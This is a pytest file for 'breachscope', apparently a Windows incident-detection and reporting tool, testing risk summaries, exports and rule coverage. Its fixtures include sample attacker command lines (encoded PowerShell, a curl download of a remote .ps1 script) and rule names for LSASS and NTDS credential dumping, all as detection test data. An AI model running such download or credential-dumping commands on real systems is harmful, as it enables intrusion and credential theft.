"""리포트 요약/권고 로직 테스트"""

from breachscope.reporting import build_summary
from breachscope.schemas import Event, Finding


def _finding(rule_name: str, severity: str, tech: str, host: str = "WS-01") -> Finding:
    return Finding(
        rule_id=rule_name.upper().replace(" ", "-"),
        rule_name=rule_name,
        severity=severity,
        mitre_technique=tech,
        event=Event(
            timestamp="2026-01-01T00:00:00Z",
            host=host,
            source="ProcessCreate",
            event_id="4688",
            command_line="powershell.exe -encodedcommand AAAABBBBCCCCDDDD",
        ),
        matched_value="-encodedcommand",
        matched_context="powershell.exe -encodedcommand AAAA",
    )


def test_build_summary_adds_risk_and_recommendations():
    summary = build_summary([
        _finding("Encoded PowerShell Command", "medium", "T1059.001"),
        _finding("Suspicious Web Download", "medium", "T1105", host="WS-02"),
        _finding("LSASS Dump Attempt", "high", "T1003.001"),
    ])

    assert summary["risk"]["score"] > 0
    assert summary["risk"]["level"] in {"medium", "high", "critical"}
    assert len(summary["executive_summary"]) >= 2
    assert any("PowerShell" in action for action in summary["recommended_actions"])
    assert any("LSASS" in action for action in summary["recommended_actions"])
    assert len(summary["top_findings"]) == 3


def test_build_summary_no_findings_is_actionable():
    summary = build_summary([])

    assert summary["risk"]["score"] == 0
    assert summary["risk"]["level"] == "none"
    assert summary["total_findings"] == 0
    assert summary["recommended_actions"]

from pathlib import Path
import zipfile

from breachscope.reporting import export_manifest, export_case_package
from breachscope.schemas import Report


def test_manifest_and_case_package_are_created(tmp_path: Path):
    finding = _finding("LSASS Dump Attempt", "high", "T1003.001")
    report = Report(
        summary=build_summary([finding]),
        findings=[finding],
        events=[finding.event],
    )
    html = tmp_path / "report.html"
    html.write_text("<html>ok</html>", encoding="utf-8")

    manifest_path = tmp_path / "report.manifest.json"
    manifest = export_manifest(report, manifest_path, artifact_paths=[html])

    assert manifest_path.exists()
    assert manifest["case"]["total_findings"] == 1
    assert manifest["case"]["risk_score"] > 0
    assert manifest["evidence_hashes"]["events"][0]["hash"]
    assert manifest["artifacts"][0]["sha256"]

    zip_path = export_case_package(tmp_path / "report.zip", [html, manifest_path])
    assert zip_path.exists()
    with zipfile.ZipFile(zip_path) as zf:
        assert set(zf.namelist()) == {"report.html", "report.manifest.json"}

from breachscope.reporting import render_html, export_iocs_csv


def test_summary_extracts_indicators_and_attack_timeline():
    finding = Finding(
        rule_id="R-DL",
        rule_name="Suspicious Web Download",
        severity="medium",
        mitre_technique="T1105",
        event=Event(
            timestamp="2026-01-01T00:01:00Z",
            host="WS-02",
            source="ProcessCreate",
            event_id="4688",
            user="CORP\\bob",
            command_line="powershell curl https://example.local/a.ps1 -OutFile C:\\Temp\\a.ps1",
        ),
        matched_value="curl",
        matched_context="curl https://example.local/a.ps1 -OutFile C:\\Temp\\a.ps1",
    )
    summary = build_summary([finding])

    assert summary["indicator_totals"]["url"] == 1
    assert summary["indicator_totals"]["domain"] == 1
    assert summary["indicator_totals"]["path"] == 1
    assert summary["attack_coverage"][0]["tactic"] == "Command and Control"
    assert summary["incident_timeline"][0]["rule"] == "Suspicious Web Download"


def test_render_html_redaction_does_not_mutate_report(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("BS_REDACT", "1")
    original_cmd = "powershell.exe -encodedcommand AAAABBBBCCCCDDDD"
    finding = _finding("Encoded PowerShell Command", "medium", "T1059.001")
    finding.event.command_line = original_cmd
    report = Report(summary=build_summary([finding]), findings=[finding], events=[finding.event])

    render_html(report, tmp_path / "report.html")

    assert report.events[0].command_line == original_cmd
    assert report.findings[0].event.command_line == original_cmd


def test_export_iocs_csv(tmp_path: Path):
    finding = Finding(
        rule_id="R-DL",
        rule_name="Suspicious Web Download",
        severity="medium",
        mitre_technique="T1105",
        event=Event(
            timestamp="2026-01-01T00:01:00Z",
            host="WS-02",
            source="ProcessCreate",
            event_id="4688",
            command_line="curl https://example.local/a.ps1",
        ),
        matched_value="curl",
        matched_context="curl https://example.local/a.ps1",
    )
    report = Report(summary=build_summary([finding]), findings=[finding], events=[finding.event])
    out = tmp_path / "report.iocs.csv"

    export_iocs_csv(report, out)

    text = out.read_text(encoding="utf-8")
    assert "type,value,count" in text
    assert "https://example.local/a.ps1" in text

from breachscope.rulepack import summarize_rules, export_rule_catalog_csv
from breachscope.rules import load_rules


def test_rule_pack_summary_and_catalog_export(tmp_path: Path):
    rules = load_rules(Path("rules"))
    summary = summarize_rules(rules)

    assert summary["total_rules"] >= 50
    assert summary["unique_techniques"] >= 25
    assert summary["coverage_percent_core_windows"] >= 80
    assert any(row["tactic"] == "Credential Access" for row in summary["tactic_coverage"])
    assert any(row["tactic"] == "Exfiltration" for row in summary["tactic_coverage"])

    out = export_rule_catalog_csv(rules, tmp_path / "report.rules.csv")
    text = out.read_text(encoding="utf-8")
    assert "id,name,severity,mitre_technique" in text
    assert "R-NTDSUTIL-Dump" in text
